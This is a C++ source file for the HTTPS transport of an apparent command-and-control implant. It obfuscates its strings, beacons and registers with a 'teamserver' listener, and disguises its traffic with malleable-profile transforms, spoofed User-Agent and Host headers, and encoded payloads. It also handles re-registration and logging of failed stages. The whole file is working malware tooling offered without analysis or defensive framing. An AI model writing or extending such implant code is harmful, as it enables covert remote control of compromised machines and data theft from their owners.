#include "HttpsTransport.h"
#include "core/StageLog.h"
#include "core/Transport.h"
#include "evasive/Strings.h"

#include <windows.h>

#include <unordered_map>

namespace tx {

bool HttpsTransport::send(std::string_view path, std::string_view body,
                          std::string_view agent_id, Reply& out) {
    std::unordered_map<std::string, std::string> hdrs;
    auto x_agent = OBF_KEEP("X-Agent");
    if (!agent_id.empty()) hdrs[x_agent.c_str()] = std::string(agent_id);

    // Protocol paths are raw JSON to the listener — skip malleable transforms.
    auto p_reg = OBF_KEEP("/register");
    auto p_beacon = OBF_KEEP("/beacon");
    auto p_chunk = OBF_KEEP("/chunk");
    auto p_rk = OBF_KEEP("/rotate_key");
    const bool protocol_path =
        path == p_reg.c_str() || path == p_beacon.c_str() ||
        path == p_chunk.c_str() || path == p_rk.c_str();

    std::string real_path(path);
    std::string enc(body);
    if (!protocol_path) {
        const malleable::Block* b = &mp_.http_post;
        if (path == "/check") b = &mp_.http_get;
        for (const auto& [k, v] : b->headers) hdrs[k] = v;
        if (!mp_.user_agent.empty()) hdrs["User-Agent"] = mp_.user_agent;
        if (!mp_.host.empty()) hdrs["Host"] = mp_.host;

        std::string param;
        enc = malleable::encode_payload(b->transforms, body, param);
        if (!b->uri.empty()) real_path = b->uri;
        if (!param.empty()) {
            real_path += (real_path.find('?') == std::string::npos ? "?" : "&");
            real_path += param + "=" + enc;
            enc.clear();
        }
    } else if (!mp_.user_agent.empty()) {
        hdrs["User-Agent"] = mp_.user_agent;
    }

    auto r = transport::https_post(host_, port_, real_path, enc, hdrs, ignore_cert_, use_tls_);
    out.body = r.body;
    // Protocol paths: deliver JSON error bodies (e.g. 404 unknown_agent) so the
    // implant can re-register after a teamserver restart.
    if (protocol_path && !r.ok && !r.body.empty() &&
        (r.status == 404 || r.status == 400 || r.status == 401)) {
        out.ok = true;
        return true;
    }
    out.ok = r.ok;
    if (!out.ok) {
        const DWORD winerr = GetLastError();
        char line[160];
        wsprintfA(line, "http-status-%d err-%u tls-%d path-%s",
                  r.status, winerr, use_tls_ ? 1 : 0, real_path.c_str());
        C2_STAGE(line);
    }
    return out.ok;
}

} // namespace tx
